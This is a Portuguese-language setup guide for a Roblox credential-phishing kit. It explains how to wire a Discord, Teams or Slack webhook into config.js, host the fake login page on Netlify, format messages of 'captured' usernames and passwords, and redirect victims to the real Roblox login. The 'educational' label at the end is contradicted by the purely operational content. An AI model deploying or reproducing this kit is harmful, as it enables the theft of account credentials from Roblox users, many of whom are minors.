# ⚡ Configuração Rápida

## 🎯 Passo a Passo em 5 Minutos

### 1. 📝 Configurar Webhook (2 min)

**Opção A - Discord (Recomendado):**
1. Abra o Discord
2. Vá em um canal → Configurações → Integrações → Webhooks
3. Clique em "Novo Webhook"
4. Copie a URL (algo como: `https://discord.com/api/webhooks/123456789/abcdef...`)
5. Abra o arquivo `config.js`
6. Substitua a linha 3:
```javascript
webhookUrl: 'COLE_SUA_URL_AQUI',
```

### 2. 🌐 Hospedar no Netlify (2 min)

1. Acesse [netlify.com](https://netlify.com)
2. Faça login com GitHub
3. Arraste a pasta `ROBLOX-Phishing` para a área de upload
4. Aguarde o deploy (aparecerá um link como `https://random-name.netlify.app`)

### 3. 🧪 Testar (1 min)

1. Acesse o link do Netlify
2. Digite dados de teste (ex: `teste@email.com` / `senha123`)
3. Clique em "Entrar"
4. Verifique se a mensagem chegou no Discord

## 🔧 Configurações Avançadas

### Personalizar Mensagem
Edite no `config.js`:
```javascript
messageFormat: {
    title: '🔐 **Dados Capturados - Roblox Login**',
    fields: [
        '👤 **Usuário:** {username}',
        '🔑 **Senha:** {password}',
        '⏰ **Data/Hora:** {timestamp}',
        // Adicione mais campos aqui
    ]
}
```

### Alterar Redirecionamento
```javascript
redirectUrl: 'https://www.roblox.com/login',
```

### Outros Webhooks

**Microsoft Teams:**
```javascript
webhookUrl: 'https://sua-empresa.webhook.office.com/webhookb2/...',
```

**Slack:**
```javascript
webhookUrl: 'https://hooks.slack.com/services/T00000000/B00000000/...',
```

## 🚨 Solução de Problemas

**Dados não chegam no webhook?**
- Verifique se a URL está correta
- Teste o webhook com um serviço como webhook.site
- Verifique o console do navegador (F12)

**Site não carrega no Netlify?**
- Verifique se todos os arquivos foram enviados
- Confirme se o `index.html` está na raiz

**Formulário não captura dados?**
- O React pode demorar para carregar
- Aumente o `reactLoadDelay` no `config.js`

## 📞 Suporte Rápido

- **Discord não funciona?** Use Teams ou Slack
- **Netlify com erro?** Tente GitHub Pages
- **Script não funciona?** Verifique o console (F12)

---

**✅ Pronto! Seu phishing educativo está funcionando!** 🎓 